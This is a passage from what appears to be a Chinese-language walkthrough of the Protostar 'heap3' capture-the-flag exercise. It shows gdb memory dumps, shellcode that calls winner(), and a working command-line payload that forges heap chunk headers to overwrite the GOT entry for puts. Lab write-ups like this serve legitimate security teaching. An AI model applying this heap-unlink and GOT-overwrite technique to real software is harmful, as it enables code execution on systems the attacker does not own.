        ```

    ```bash
    (gdb) x winner 
    0x8048864 <winner>:	0x83e58955
    (gdb) disassemble 0x8048790
    Dump of assembler code for function puts@plt:
    0x08048790 <puts@plt+0>:	jmp    DWORD PTR ds:0x804b128
    0x08048796 <puts@plt+6>:	push   0x68
    0x0804879b <puts@plt+11>:	jmp    0x80486b0
    End of assembler dump.
    (gdb) x 0x804b128
    0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x08048796
    (gdb) info proc map
    process 17219
    cmdline = '/opt/protostar/bin/heap3'
    cwd = '/opt/protostar/bin'
    exe = '/opt/protostar/bin/heap3'
    Mapped address spaces:

      Start Addr   End Addr       Size     Offset objfile
      0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
      0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
      0x804c000  0x804d000     0x1000          0           [heap]
      0xb7e96000 0xb7e97000     0x1000          0        
      0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
      0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
      0xb7fd9000 0xb7fdc000     0x3000          0        
      0xb7fe0000 0xb7fe2000     0x2000          0        
      0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
      0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
      0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
      0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
      0xbffeb000 0xc0000000    0x15000          0           [stack]
    ```

- 通过 [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm) 将调用函数 `winner` 的汇编转换为 shellcode

    ```bash
    # move the address of winner() into eax and call
    mov eax, 0x8048864
    call eax
    # \xB8\x64\x88\x04\x08\xFF\xD0
    ```

### Exploit

```bash
$ ./heap3 `echo -ne "AAAA\xB8\x64\x88\x04\x08\xFF\xD0"` `python -c "print('B' * 36 + '\x65')"` `python -c "print('C' * 92 + '\xfc\xff\xff\xff' * 2 + '\x1c\xb1\x04\x08\x0c\xc0\x04\x08')"`
that wasn't too bad now, was it? @ 1662354454
Segmentation fault
```